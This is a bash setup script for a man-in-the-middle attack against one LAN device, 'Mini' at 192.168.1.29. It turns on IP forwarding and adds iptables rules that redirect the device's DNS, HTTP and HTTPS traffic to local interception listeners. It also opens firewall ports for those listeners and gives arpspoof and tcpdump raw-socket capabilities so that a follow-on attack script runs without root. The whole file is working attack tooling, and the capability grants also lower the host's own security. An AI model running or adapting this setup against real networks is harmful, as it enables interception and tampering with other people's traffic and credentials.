#!/usr/bin/env bash
# mitm-setup-root.sh — one-time privileged setup for the MITM attack.
# Run ONCE with sudo; exits in <5 seconds. After this, mitm-attack.sh needs no root.
#
#   sudo bash scripts/mitm-setup-root.sh

set -e
[[ $(id -u) -eq 0 ]] || { echo "Run with sudo"; exit 1; }

echo "[*] enabling IP forwarding..."
sysctl -w net.ipv4.ip_forward=1

echo "[*] adding iptables NAT rules for Mini (192.168.1.29)..."
MINI="192.168.1.29"
IFACE="wlp0s20f3"

# Remove any stale rules first (both old 5353 and new 5354)
for port in 5353 5354; do
  iptables -t nat -D PREROUTING -i "$IFACE" -s "$MINI" -p udp --dport 53 -j REDIRECT --to-port $port 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE" -s "$MINI" -p tcp --dport 53 -j REDIRECT --to-port $port 2>/dev/null || true
done
iptables -t nat -D PREROUTING -i "$IFACE" -s "$MINI" -p tcp --dport 80  -j REDIRECT --to-port 8080 2>/dev/null || true
iptables -t nat -D PREROUTING -i "$IFACE" -s "$MINI" -p tcp --dport 443 -j REDIRECT --to-port 4443 2>/dev/null || true

# Add rules — use port 5354 (avahi-daemon holds 5353)
iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI" -p udp --dport 53  -j REDIRECT --to-port 5354
iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI" -p tcp --dport 53  -j REDIRECT --to-port 5354
iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI" -p tcp --dport 80  -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI" -p tcp --dport 443 -j REDIRECT --to-port 4443
echo "[*] iptables NAT rules added."

# Punch UFW holes so Mini's redirected traffic reaches our listeners
iptables -D INPUT -i "$IFACE" -s "$MINI" -p udp --dport 5354 -j ACCEPT 2>/dev/null || true
iptables -D INPUT -i "$IFACE" -s "$MINI" -p tcp --dport 5354 -j ACCEPT 2>/dev/null || true
iptables -D INPUT -i "$IFACE" -s "$MINI" -p tcp --dport 4443 -j ACCEPT 2>/dev/null || true
iptables -D INPUT -i "$IFACE" -s "$MINI" -p tcp --dport 8080 -j ACCEPT 2>/dev/null || true
iptables -I INPUT -i "$IFACE" -s "$MINI" -p udp --dport 5354 -j ACCEPT
iptables -I INPUT -i "$IFACE" -s "$MINI" -p tcp --dport 5354 -j ACCEPT
iptables -I INPUT -i "$IFACE" -s "$MINI" -p tcp --dport 4443 -j ACCEPT
iptables -I INPUT -i "$IFACE" -s "$MINI" -p tcp --dport 8080 -j ACCEPT
echo "[*] UFW/INPUT rules added for Mini."

echo "[*] giving arpspoof cap_net_raw (so it runs without sudo)..."
setcap cap_net_raw+eip /usr/bin/arpspoof
getcap /usr/bin/arpspoof

echo "[*] giving tcpdump cap_net_raw (if not already in wireshark group)..."
setcap cap_net_raw+eip /usr/bin/tcpdump 2>/dev/null || true

echo "[*] Setup complete. Now run WITHOUT sudo:"
echo "    bash scripts/mitm-attack.sh"
